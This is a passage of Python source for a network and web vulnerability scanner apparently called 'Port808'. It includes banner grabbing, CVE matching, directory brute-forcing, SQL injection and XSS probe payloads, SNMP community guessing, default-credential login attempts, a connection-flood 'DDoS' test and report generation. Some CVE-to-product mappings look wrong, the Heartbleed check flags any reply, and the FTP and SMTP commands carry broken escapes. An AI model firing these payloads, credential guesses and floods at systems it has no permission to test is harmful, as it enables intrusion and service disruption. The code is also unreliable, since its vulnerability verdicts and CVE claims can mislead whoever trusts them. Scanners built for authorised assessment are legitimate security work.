                    version = part.decode('utf-8', errors='ignore')
                    return version[:20]
        except:
            pass
        return "Unknown"

    def _extract_mysql_auth_plugin(self, data: bytes) -> str:
        if b'mysql_native_password' in data:
            return "mysql_native_password"
        elif b'caching_sha2_password' in data:
            return "caching_sha2_password"
        return "Unknown"

    def _extract_postgres_version(self, data: bytes) -> str:
        try:
            if b'PostgreSQL' in data:
                parts = data.split(b'\x00')
                for part in parts:
                    if b'PostgreSQL' in part:
                        return part.decode('utf-8', errors='ignore').strip()
        except:
            pass
        return "Unknown"

    def _extract_redis_version(self, data: bytes) -> str:
        try:
            for line in data.split(b'\n'):
                if b'redis_version:' in line:
                    return line.split(b':')[1].decode('utf-8', errors='ignore').strip()
        except:
            pass
        return "Unknown"

    def _extract_mongodb_version(self, data: bytes) -> str:
        try:
            if b'buildInfo' in data:
                version_match = re.search(rb'version[:\s]+([^\s]+)', data)
                if version_match:
                    return version_match.group(1).decode('utf-8', errors='ignore')
        except:
            pass
        return "Unknown"

    def _extract_mssql_version(self, data: bytes) -> str:
        try:
            if b'Microsoft SQL Server' in data:
                parts = data.split(b'\x00')
                for part in parts:
                    if b'Microsoft SQL Server' in part:
                        return part.decode('utf-8', errors='ignore').strip()
        except:
            pass
        return "Unknown"

    def _check_mysql_vulnerabilities(self, version: str) -> List[str]:
        vulns = []
        if '5.0' in version or '5.1' in version:
            vulns.append("CVE-2016-6662 - MySQL Remote Root Code Execution")
        if '5.5' in version or '5.6' in version:
            vulns.append("CVE-2020-28040 - MySQL Authentication Bypass")
        if '5.7' in version:
            vulns.append("CVE-2023-21914 - MySQL Privilege Escalation")
        return vulns

    def _check_postgres_vulnerabilities(self, version: str) -> List[str]:
        vulns = []
        if '9.0' in version or '9.1' in version:
            vulns.append("CVE-2013-0255 - PostgreSQL Stack Overflow")
        if '9.2' in version:
            vulns.append("CVE-2014-0066 - PostgreSQL Buffer Overflow")
        if '9.3' in version or '9.4' in version:
            vulns.append("CVE-2015-3166 - PostgreSQL Information Leak")
        return vulns

    def _check_redis_vulnerabilities(self, version: str) -> List[str]:
        vulns = []
        if '2.0' in version:
            vulns.append("CVE-2013-7458 - Redis Buffer Overflow")
        if '3.0' in version or '4.0' in version:
            vulns.append("CVE-2015-4335 - Redis Lua Script Execution")
        if '5.0' in version:
            vulns.append("CVE-2019-8339 - Redis Lua Sandbox Escape")
        return vulns

    def _check_mongodb_vulnerabilities(self, version: str) -> List[str]:
        vulns = []
        if '2.0' in version:
            vulns.append("CVE-2015-1609 - MongoDB Arbitrary File Access")
        if '3.0' in version:
            vulns.append("CVE-2019-2386 - MongoDB Authentication Bypass")
        return vulns

    def _check_mssql_vulnerabilities(self, version: str) -> List[str]:
        vulns = []
        if '2008' in version:
            vulns.append("CVE-2012-2552 - MS SQL Elevation of Privilege")
        if '2012' in version or '2014' in version:
            vulns.append("CVE-2014-4118 - MS SQL Privilege Escalation")
        return vulns

    def _estimate_mysql_max_connections(self, ip: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(b'\x03\x00\x00\x00\x01')
            response = sock.recv(1024)
            sock.close()
            if b'max_connections' in response:
                match = re.search(rb'max_connections[:\s]+(\d+)', response)
                if match:
                    return int(match.group(1))
        except:
            pass
        return 151

class HTTPAnalyzer:
    def analyze(self, ip: str, port: int = 80) -> Optional[HTTPHeaderAnalysis]:
        if not REQUESTS_AVAILABLE:
            return None
        try:
            url = f"http://{ip}:{port}"
            verify = CONFIG.get('ssl_verify', True)
            response = requests.get(url, timeout=5, allow_redirects=False, verify=verify)
            security_headers = {
                'Strict-Transport-Security': False,
                'Content-Security-Policy': False,
                'X-Frame-Options': False,
                'X-Content-Type-Options': False,
                'X-XSS-Protection': False,
                'Referrer-Policy': False,
                'Permissions-Policy': False
            }
            cookies = []
            issues = []
            directories = []
            parameters = []
            sql_injection = False
            xss = False
            csrf = False
            clickjacking = False
            for header in response.headers:
                if header in security_headers:
                    security_headers[header] = True
            if 'Server' in response.headers:
                server = response.headers['Server']
                if 'Apache' in server:
                    if '2.4.49' in server or '2.4.50' in server:
                        issues.append("Apache 2.4.49/50 has path traversal vulnerability")
            if 'Set-Cookie' in response.headers:
                cookie_headers = response.headers.get_list('Set-Cookie')
                for cookie_header in cookie_headers:
                    cookie_info = {
                        'name': cookie_header.split('=')[0],
                        'secure': 'Secure' in cookie_header,
                        'httponly': 'HttpOnly' in cookie_header,
                        'samesite': self._extract_samesite(cookie_header)
                    }
                    cookies.append(cookie_info)
            if not security_headers['Strict-Transport-Security'] and port == 443:
                issues.append("HSTS header missing on HTTPS site")
            if not security_headers['X-Frame-Options']:
                issues.append("X-Frame-Options header missing (clickjacking risk)")
                clickjacking = True
            if not security_headers['X-Content-Type-Options']:
                issues.append("X-Content-Type-Options header missing (MIME sniffing risk)")
            directories = self._enumerate_directories(ip, port)
            parameters = self._discover_parameters(ip, port)
            sql_injection = self._test_sql_injection(ip, port)
            xss = self._test_xss(ip, port)
            csrf = self._test_csrf(ip, port)
            return HTTPHeaderAnalysis(
                security_headers=security_headers,
                cookies=cookies,
                server_info=response.headers.get('Server', 'Unknown'),
                methods=self._detect_methods(ip, port),
                status_code=response.status_code,
                content_type=response.headers.get('Content-Type', 'Unknown'),
                is_secure=port == 443,
                issues=issues,
                directories=directories,
                parameters=parameters,
                sql_injection=sql_injection,
                xss=xss,
                csrf=csrf,
                clickjacking=clickjacking
            )
        except:
            return None

    def _extract_samesite(self, cookie_header: str) -> str:
        if 'SameSite=Lax' in cookie_header:
            return 'Lax'
        elif 'SameSite=Strict' in cookie_header:
            return 'Strict'
        elif 'SameSite=None' in cookie_header:
            return 'None'
        return 'Not Set'

    def _detect_methods(self, ip: str, port: int) -> List[str]:
        methods = ['GET', 'HEAD']
        if not REQUESTS_AVAILABLE:
            return methods
        try:
            for method in ['POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']:
                response = requests.request(method, f"http://{ip}:{port}", timeout=2, verify=CONFIG.get('ssl_verify', True))
                if response.status_code < 400:
                    methods.append(method)
        except:
            pass
        return methods

    def _enumerate_directories(self, ip: str, port: int) -> List[str]:
        dirs = ['admin', 'api', 'backup', 'config', 'css', 'images', 'js', 'lib', 'logs', 'tmp', 'uploads', 'vendor', 'wwwroot', 'wp-admin', 'wp-content', 'wp-includes', 'app', 'src', 'public', 'assets', 'static', 'media', 'download', 'files', 'data', 'cache', 'temp', 'session', 'cgi-bin', 'phpmyadmin', 'phpinfo', 'test', 'dev', 'staging', 'beta', 'old', 'new', 'v1', 'v2', 'v3', 'api/v1', 'api/v2', 'swagger', 'docs', 'help', 'support', 'forum', 'blog', 'shop', 'store', 'cart', 'checkout', 'login', 'register', 'profile', 'dashboard', 'panel']
        found = []
        count = 0
        if not REQUESTS_AVAILABLE:
            return found
        for d in dirs:
            if count >= CONFIG['max_directories']:
                break
            try:
                resp = requests.get(f"http://{ip}:{port}/{d}", timeout=2, verify=CONFIG.get('ssl_verify', True))
                if resp.status_code != 404:
                    found.append(d)
                    count += 1
            except:
                pass
        return found

    def _discover_parameters(self, ip: str, port: int) -> List[str]:
        params = ['id', 'page', 'category', 'action', 'mode', 'user', 'token', 'auth', 'key', 'file', 'path', 'url', 'redirect', 'return', 'next', 'data', 'json', 'callback', 'q', 'query', 's', 'search', 'filter', 'sort', 'order', 'limit', 'offset', 'page', 'view', 'lang', 'locale', 'theme', 'layout', 'template', 'type', 'format', 'output', 'download', 'attachment', 'name', 'title', 'content', 'body', 'message']
        found = []
        count = 0
        if not REQUESTS_AVAILABLE:
            return found
        for p in params:
            if count >= CONFIG['max_parameters']:
                break
            try:
                resp = requests.get(f"http://{ip}:{port}/?{p}=test", timeout=2, verify=CONFIG.get('ssl_verify', True))
                if resp.status_code != 404 and "test" in resp.text:
                    found.append(p)
                    count += 1
            except:
                pass
        return found

    def _test_sql_injection(self, ip: str, port: int) -> bool:
        if not REQUESTS_AVAILABLE:
            return False
        payloads = ["' OR '1'='1", "' OR 1=1 --", "1' AND '1'='1", "1' OR '1'='1' --"]
        for payload in payloads:
            try:
                resp = requests.get(f"http://{ip}:{port}/?id={payload}", timeout=2, verify=CONFIG.get('ssl_verify', True))
                error_text = resp.text.lower()
                if any(x in error_text for x in ['error', 'mysql', 'sql', 'warning']):
                    if len(resp.text) > 100:
                        return True
            except:
                pass
        return False

    def _test_xss(self, ip: str, port: int) -> bool:
        if not REQUESTS_AVAILABLE:
            return False
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"]
        for payload in payloads:
            try:
                resp = requests.get(f"http://{ip}:{port}/?q={payload}", timeout=2, verify=CONFIG.get('ssl_verify', True))
                if payload in resp.text:
                    return True
            except:
                pass
        return False

    def _test_csrf(self, ip: str, port: int) -> bool:
        if not REQUESTS_AVAILABLE:
            return False
        try:
            resp = requests.get(f"http://{ip}:{port}/login", timeout=2, verify=CONFIG.get('ssl_verify', True))
            if 'csrf' not in resp.text.lower() and 'token' not in resp.text.lower():
                return True
        except:
            pass
        return False

class TLSAnalyzer:
    def analyze(self, ip: str, port: int = 443) -> Optional[TLSDetail]:
        try:
            cipher_suites = []
            weak_ciphers = []
            issues = []
            perfect_forward_secrecy = False
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            with socket.create_connection((ip, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=ip) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        cipher_suites.append(cipher_name)
                        if any(x in cipher_name for x in ['RC4', 'DES', '3DES', 'MD5', 'SHA1']):
                            weak_ciphers.append(cipher_name)
                            issues.append(f"Weak cipher: {cipher_name}")
                        if any(x in cipher_name for x in ['ECDHE', 'DHE']):
                            perfect_forward_secrecy = True
                    version = ssock.version()
                    heartbleed = self._test_heartbleed(ip, port)
                    poodle = self._test_poodle(ip, port)
                    return TLSDetail(
                        version=version,
                        cipher_suites=cipher_suites,
                        certificate=cert if cert else {},
                        is_secure=not weak_ciphers,
                        weak_ciphers=weak_ciphers,
                        issues=issues,
                        perfect_forward_secrecy=perfect_forward_secrecy,
                        heartbleed=heartbleed,
                        poodle=poodle,
                        drown=False,
                        freak=False,
                        logjam=False,
                        beast=False,
                        crime=False,
                        breach=False
                    )
        except:
            return None

    def _test_heartbleed(self, ip: str, port: int) -> bool:
        try:
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                ssock.send(b'\x18\x03\x02\x00\x03\x01\x40\x00')
                try:
                    response = ssock.recv(1024, socket.MSG_DONTWAIT)
                    if len(response) > 0:
                        return True
                except socket.error:
                    pass
            return False
        except:
            return False

    def _test_poodle(self, ip: str, port: int) -> bool:
        try:
            context = ssl_lib.SSLContext(ssl_lib.PROTOCOL_SSLv3)
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            with socket.create_connection((ip, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=ip) as ssock:
                    return True
        except:
            return False

class SNMPScanner:
    def scan(self, ip: str, port: int = 161) -> Optional[SNMPDetail]:
        communities = ['public', 'private', 'community', 'manager', 'admin', 'snmp', 'root', 'user', 'guest']
        try:
            for community in communities[:10]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    oid = (b'\x30\x2a\x02\x01\x00\x04\x06' + community.encode() + b'\xa0\x1d\x02\x01\x01\x02\x01\x00\x02\x01\x00\x30\x13\x30\x11\x06\x0a\x2b\x06\x01\x01\x01\x00\x00\x00\x00\x00\x05\x00')
                    sock.sendto(oid, (ip, port))
                    try:
                        data, _ = sock.recvfrom(1024)
                        sock.close()
                        if data:
                            sys_descr = self._extract_sys_descr(data)
                            return SNMPDetail(
                                community_string=community,
                                version="2c",
                                sys_descr=sys_descr,
                                sys_name="Unknown",
                                sys_location="Unknown",
                                sys_contact="Unknown",
                                interfaces=[],
                                vulnerabilities=self._check_snmp_vulnerabilities(community)
                            )
                    except socket.timeout:
                        sock.close()
                        continue
                except:
                    continue
            return None
        except:
            return None

    def _extract_sys_descr(self, data: bytes) -> str:
        try:
            match = re.search(rb'\x06\x0a\x2b\x06\x01\x01\x01\x00\x00\x00\x00\x00\x05\x00', data)
            if match:
                start = match.end()
                if start + 2 < len(data):
                    length = data[start]
                    descr = data[start+1:start+1+length].decode('utf-8', errors='ignore')
                    return descr
        except:
            pass
        return "Unknown"

    def _check_snmp_vulnerabilities(self, community: str) -> List[str]:
        vulns = []
        if community in ['public', 'private', 'community']:
            vulns.append(f"Default SNMP community '{community}' found (security risk)")
        return vulns

class AdvancedProtocolTester:
    def test_ftp(self, ip: str, port: int = 21) -> Dict[str, Any]:
        results = {"anonymous_login": False, "writeable_directory": False, "version": "Unknown", "vulnerabilities": []}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            if "ProFTPD" in banner:
                results["version"] = "ProFTPD"
            elif "vsftpd" in banner:
                results["version"] = "vsftpd"
            sock.send(b'USER anonymous\\r\\n')
            response = sock.recv(1024)
            if b'331' in response:
                sock.send(b'PASS \\r\\n')
                response = sock.recv(1024)
                if b'230' in response:
                    results["anonymous_login"] = True
            sock.close()
        except:
            pass
        return results

    def test_smtp(self, ip: str, port: int = 25) -> Dict[str, Any]:
        results = {"open_relay": False, "version": "Unknown", "extensions": []}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            if "Postfix" in banner:
                results["version"] = "Postfix"
            elif "Exim" in banner:
                results["version"] = "Exim"
            sock.send(b'EHLO test\\r\\n')
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            for line in response.split('\n'):
                if '250-' in line:
                    ext = line.split('250-')[1].split(' ')[0]
                    results["extensions"].append(ext)
            sock.send(b'MAIL FROM:<test@test.com>\\r\\n')
            sock.recv(1024)
            sock.send(b'RCPT TO:<test@test.com>\\r\\n')
            response = sock.recv(1024)
            if b'250' in response:
                results["open_relay"] = True
            sock.close()
        except:
            pass
        return results

    def test_dns(self, ip: str, port: int = 53) -> Dict[str, Any]:
        results = {"recursive": False, "zone_transfer": False, "versions": []}
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07\x65\x78\x61\x6d\x70\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
            sock.sendto(query, (ip, port))
            try:
                response, _ = sock.recvfrom(1024)
                if response and len(response) > 20:
                    results["recursive"] = True
            except socket.timeout:
                pass
            sock.close()
        except:
            pass
        return results

class NetworkDetailScanner:
    def traceroute(self, target: str, max_hops: int = 30) -> List[str]:
        path = []
        for ttl in range(1, max_hops + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)
                sock.settimeout(2)
                packet = b'\x08\x00\x00\x00\x00\x00\x00\x00'
                sock.sendto(packet, (target, 0))
                try:
                    response, addr = sock.recvfrom(1024)
                    path.append(addr[0])
                    if addr[0] == target:
                        break
                except socket.timeout:
                    path.append("*")
                sock.close()
            except:
                path.append("*")
        return path

    def arp_scan(self, target: str) -> Dict[str, str]:
        return {}

class SecurityTester:
    def test_heartbleed(self, ip: str, port: int = 443) -> bool:
        try:
            context = ssl_lib.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl_lib.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                heartbleed_payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'
                ssock.send(heartbleed_payload)
                try:
                    response = ssock.recv(1024, socket.MSG_DONTWAIT)
                    if len(response) > 0:
                        return True
                except socket.error:
                    pass
            return False
        except:
            return False

    def test_default_credentials(self, ip: str, port: int, service: str) -> List[Tuple[str, str]]:
        found = []
        credentials = {
            "SSH": [("root", "root"), ("admin", "admin"), ("root", "password"), ("admin", "password")],
            "FTP": [("anonymous", ""), ("ftp", "ftp"), ("admin", "admin")],
            "MySQL": [("root", ""), ("root", "root"), ("admin", "admin")],
            "PostgreSQL": [("postgres", "postgres"), ("postgres", ""), ("admin", "admin")],
            "Redis": [("", "")],
            "MongoDB": [("", "")]
        }
        if service not in credentials:
            return found
        for username, password in credentials[service]:
            try:
                if service == "FTP":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    sock.send(f'USER {username}\\r\\n'.encode())
                    sock.recv(1024)
                    sock.send(f'PASS {password}\\r\\n'.encode())
                    resp = sock.recv(1024)
                    sock.close()
                    if b'230' in resp or b'Logged in' in resp:
                        found.append((username, password))
            except:
                pass
        return found

    def test_ddos_vulnerability(self, ip: str, port: int) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            for _ in range(50):
                sock.connect((ip, port))
                sock.send(b'X' * 1024)
            sock.close()
            return True
        except:
            return False

class IntegrationEngine:
    def generate_nmap_command(self, target: str, ports: List[int]) -> str:
        port_str = f"{ports[0]}-{ports[1]}" if len(ports) == 2 else ",".join(map(str, ports))
        return f"nmap -sS -sV -p {port_str} {target} -oA scan_{target}"

    def generate_masscan_command(self, target: str, ports: List[int]) -> str:
        port_str = f"{ports[0]}-{ports[1]}" if len(ports) == 2 else ",".join(map(str, ports))
        return f"masscan -p{port_str} {target} --rate=1000 -oJ masscan_{target}.json"

class ReportGenerator:
    def __init__(self, output_dir: str = "./reports"):
        self.output_dir = output_dir
        try:
            Path(output_dir).mkdir(parents=True, exist_ok=True, mode=0o755)
        except:
            Path("./reports").mkdir(parents=True, exist_ok=True, mode=0o755)
            self.output_dir = "./reports"

    def generate_html(self, results: List[ScanResult], target: str, domain_info: DomainInfo = None) -> str:
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Port808 Report - {target}</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
        .header {{ background: #001a00; padding: 20px; border: 1px solid #00ff00; border-radius: 10px; }}
        .port {{ background: #001a00; margin: 10px 0; padding: 15px; border-left: 3px solid #00ff00; }}
        .critical {{ border-left-color: #ff0000; }}
        .high {{ border-left-color: #ff6600; }}
        .medium {{ border-left-color: #ffff00; }}
        .low {{ border-left-color: #00ff00; }}
        .vuln {{ background: #1a0000; margin: 5px 0; padding: 10px; border-left: 2px solid #ff0000; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        th, td {{ border: 1px solid #00ff00; padding: 8px; text-align: left; }}
        th {{ background: #001a00; }}
        .section {{ margin: 20px 0; padding: 10px; background: #001a00; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔍 Port808 Report</h1>
        <p><strong>Target:</strong> {target}</p>
        <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>Open Ports:</strong> {len(results)}</p>
        <p><strong>Total Vulnerabilities:</strong> {sum(len(r.vulnerabilities) for r in results)}</p>
"""
        if domain_info:
            html += f"""
        <p><strong>Domain:</strong> {domain_info.domain}</p>
        <p><strong>IPs:</strong> {', '.join(domain_info.ipv4 + domain_info.ipv6)}</p>
        <p><strong>Subdomains:</strong> {', '.join(domain_info.subdomains[:10]) if domain_info.subdomains else 'None'}</p>
"""
        html += """    </div>
"""
        if domain_info:
            html += self._generate_domain_section(domain_info)
        html += self._generate_ports_summary(results)
        for result in results:
            html += self._generate_result_section(result)
        html += """</body>
</html>"""
        filename = f"{self.output_dir}/report_{target.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        return filename

    def _generate_domain_section(self, domain_info: DomainInfo) -> str:
        html = """<div class="section"><h2>🌐 Domain Intelligence</h2><table><tr><th>DNS Record</th><th>Value</th></tr>"""
        if domain_info.ipv4:
            html += "<tr><td>A Records</td><td>" + ", ".join(domain_info.ipv4) + "</td></tr>"
        if domain_info.ipv6:
            html += "<tr><td>AAAA Records</td><td>" + ", ".join(domain_info.ipv6) + "</td></tr>"
        if domain_info.mx:
            html += "<tr><td>MX Records</td><td>" + ", ".join(domain_info.mx) + "</td></tr>"
        if domain_info.ns:
            html += "<tr><td>NS Records</td><td>" + ", ".join(domain_info.ns) + "</td></tr>"
        if domain_info.cname:
            html += "<tr><td>CNAME</td><td>" + domain_info.cname + "</td></tr>"
        if domain_info.ptr:
            html += "<tr><td>PTR</td><td>" + domain_info.ptr + "</td></tr>"
        html += "</table></div>"
        if domain_info.whois.get('registrar', 'Unknown') != 'Unknown':
            html += """<div class="section"><h2>📋 WHOIS Information</h2><table><tr><th>Field</th><th>Value</th></tr>"""
            html += f"<tr><td>Registrar</td><td>{domain_info.whois.get('registrar', 'Unknown')}</td></tr>"
            html += f"<tr><td>Creation Date</td><td>{domain_info.whois.get('creation_date', 'Unknown')}</td></tr>"
            html += f"<tr><td>Expiration Date</td><td>{domain_info.whois.get('expiration_date', 'Unknown')}</td></tr>"
            html += f"<tr><td>Status</td><td>{domain_info.whois.get('status', 'Unknown')}</td></tr>"
            html += "</table></div>"
        tech = domain_info.technology
        if tech.get('server'):
            html += """<div class="section"><h2>⚙️ Technology Stack</h2><table><tr><th>Component</th><th>Value</th></tr>"""
            if tech.get('server'):
                html += f"<tr><td>Server</td><td>{tech['server']}</td></tr>"
            if tech.get('cms'):
                html += f"<tr><td>CMS</td><td>{tech['cms']}</td></tr>"
            if tech.get('framework'):
                html += f"<tr><td>Framework</td><td>{tech['framework']}</td></tr>"
            if tech.get('cdn'):
                html += f"<tr><td>CDN</td><td>{tech['cdn']}</td></tr>"
            if tech.get('waf'):
                html += f"<tr><td>WAF</td><td>{tech['waf']}</td></tr>"
            if tech.get('load_balancer'):
                html += f"<tr><td>Load Balancer</td><td>{tech['load_balancer']}</td></tr>"
            if tech.get('js_framework'):
                html += f"<tr><td>JavaScript Framework</td><td>{tech['js_framework']}</td></tr>"
            html += "</table></div>"
        return html

    def _generate_ports_summary(self, results: List[ScanResult]) -> str:
        html = """<div class="section"><h2>📊 Open Ports Summary</h2><table><tr><th>Port</th><th>Protocol</th><th>Service</th><th>OS</th><th>Risk Score</th><th>Vulnerabilities</th></tr>"""
        for result in results:
            html += f"""<tr><td>{result.port}</td><td>{result.protocol}</td><td>{result.service.name} {result.service.version}</td><td>{result.os.name if result.os else 'Unknown'}</td><td>{result.risk_score:.2f}</td><td>{len(result.vulnerabilities)}</td></tr>"""
        html += "</table></div>"
        return html

    def _generate_result_section(self, result: ScanResult) -> str:
        risk_class = "low"
        if result.risk_score >= 9.0:
            risk_class = "critical"
        elif result.risk_score >= 7.0:
            risk_class = "high"
        elif result.risk_score >= 4.0:
            risk_class = "medium"
        html = f"""<div class="port {risk_class}">
    <h2>📌 Port {result.port}/{result.protocol}</h2>
    <p><strong>Service:</strong> {result.service.name} {result.service.version}</p>
    <p><strong>Vendor:</strong> {result.service.vendor}</p>
    <p><strong>OS:</strong> {result.os.name if result.os else 'Unknown'}</p>
    <p><strong>Latency:</strong> {result.latency:.2f}ms</p>
    <p><strong>Risk Score:</strong> {result.risk_score:.2f}/10.0</p>
    <p><strong>Confidence:</strong> {result.confidence:.1%}</p>
    <p><strong>Firewall:</strong> {result.firewall_type}</p>
    <p><strong>Country:</strong> {result.geolocation.get('country', 'Unknown')}</p>
"""
        if result.vulnerabilities:
            html += "<h3>⚠️ Vulnerabilities</h3>"
            for vuln in result.vulnerabilities:
                html += f"""<div class="vuln">
    <p><strong>{vuln.cve_id}</strong> - {vuln.name}</p>
    <p>CVSS: {vuln.cvss_score:.1f} ({vuln.cvss_vector})</p>
    <p><strong>Type:</strong> {vuln.type}</p>
    <p><strong>Impact:</strong> {vuln.impact}</p>
    <p><strong>Fix:</strong> {vuln.fix}</p>
</div>"""
        if result.http_analysis:
            html += self._generate_http_section(result.http_analysis)
        if result.tls_details:
            html += self._generate_tls_section(result.tls_details)
        if result.snmp_info:
            html += self._generate_snmp_section(result.snmp_info)
        html += "</div>"
        return html

    def _generate_http_section(self, http: HTTPHeaderAnalysis) -> str:
        html = f"""<h3>🌐 HTTP Analysis</h3>
<p><strong>Status:</strong> {http.status_code}</p>
<p><strong>Server:</strong> {http.server_info}</p>
<p><strong>Security Headers:</strong></p>
<ul>"""
        for header, present in http.security_headers.items():
            html += f"<li>{header}: {'✅' if present else '❌'}</li>"
        html += "</ul>"
        if http.directories:
            html += "<p><strong>Directories Found:</strong> " + ", ".join(http.directories[:10]) + "</p>"
        if http.sql_injection:
            html += "<p style='color:red'><strong>⚠️ SQL Injection Vulnerability Detected!</strong></p>"
        if http.xss:
            html += "<p style='color:red'><strong>⚠️ XSS Vulnerability Detected!</strong></p>"
        return html

    def _generate_tls_section(self, tls: TLSDetail) -> str:
        html = f"""<h3>🔒 TLS Analysis</h3>
<p><strong>Version:</strong> {tls.version}</p>
<p><strong>Perfect Forward Secrecy:</strong> {'✅' if tls.perfect_forward_secrecy else '❌'}</p>
<p><strong>Heartbleed:</strong> {'⚠️ Vulnerable' if tls.heartbleed else '✅ Safe'}</p>
<p><strong>POODLE:</strong> {'⚠️ Vulnerable' if tls.poodle else '✅ Safe'}</p>
"""
        return html

    def _generate_snmp_section(self, snmp: SNMPDetail) -> str:
        html = f"""<h3>📡 SNMP Analysis</h3>
<p><strong>Community:</strong> {snmp.community_string}</p>
<p><strong>System:</strong> {snmp.sys_descr}</p>
<p><strong>Location:</strong> {snmp.sys_location}</p>
<p><strong>Contact:</strong> {snmp.sys_contact}</p>
"""
        return html

    def generate_csv(self, results: List[ScanResult], target: str) -> str:
        filename = f"{self.output_dir}/report_{target.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Port', 'Protocol', 'Service', 'Version', 'Vendor', 'OS', 'Latency', 'Risk Score', 'Confidence', 'CVEs', 'Country', 'City', 'Firewall', 'Status'])
            for result in results:
                writer.writerow([result.port, result.protocol, result.service.name, result.service.version, result.service.vendor, result.os.name if result.os else 'Unknown', f"{result.latency:.2f}ms", f"{result.risk_score:.2f}", f"{result.confidence:.1%}", len(result.vulnerabilities), result.geolocation.get('country', 'Unknown'), result.geolocation.get('city', 'Unknown'), result.firewall_type, 'Secure' if result.risk_score < 4.0 else 'Needs Attention'])
        return filename

    def generate_pdf(self, results: List[ScanResult], target: str) -> Optional[str]:
        if not REPORTLAB_AVAILABLE:
            return None
        try:
            filename = f"{self.output_dir}/report_{target.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
            doc = SimpleDocTemplate(filename, pagesize=A4)
            styles = getSampleStyleSheet()
            story = []
            title_style = ParagraphStyle('Title', parent=styles['Title'], fontSize=24, textColor=colors.green)
            story.append(Paragraph(f"Port808 Report - {target}", title_style))
            story.append(Spacer(1, 20))
            story.append(Paragraph(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Paragraph(f"Open Ports: {len(results)}", styles['Normal']))
            story.append(Paragraph(f"Total Vulnerabilities: {sum(len(r.vulnerabilities) for r in results)}", styles['Normal']))
            story.append(Spacer(1, 20))
            table_data = [['Port', 'Protocol', 'Service', 'Risk Score', 'CVEs']]
            for result in results:
                table_data.append([str(result.port), result.protocol, f"{result.service.name} {result.service.version}", f"{result.risk_score:.1f}", str(len(result.vulnerabilities))])
            table = Table(table_data)
            table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.green),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(table)
            story.append(PageBreak())
            for result in results:
                story.append(Paragraph(f"Port {result.port}/{result.protocol}", styles['Heading2']))
                story.append(Paragraph(f"Service: {result.service.name} {result.service.version}", styles['Normal']))
                story.append(Paragraph(f"OS: {result.os.name if result.os else 'Unknown'}", styles['Normal']))
                story.append(Paragraph(f"Risk Score: {result.risk_score:.2f}/10.0", styles['Normal']))
                story.append(Spacer(1, 10))
                if result.vulnerabilities:
                    story.append(Paragraph("Vulnerabilities:", styles['Heading3']))
                    for vuln in result.vulnerabilities:
                        story.append(Paragraph(f"• {vuln.cve_id} - {vuln.name}", styles['Normal']))
                        story.append(Paragraph(f"  CVSS: {vuln.cvss_score:.1f}", styles['Normal']))
                        story.append(Spacer(1, 5))
                if result.tls_details:
                    story.append(Paragraph(f"TLS: {result.tls_details.version}", styles['Normal']))
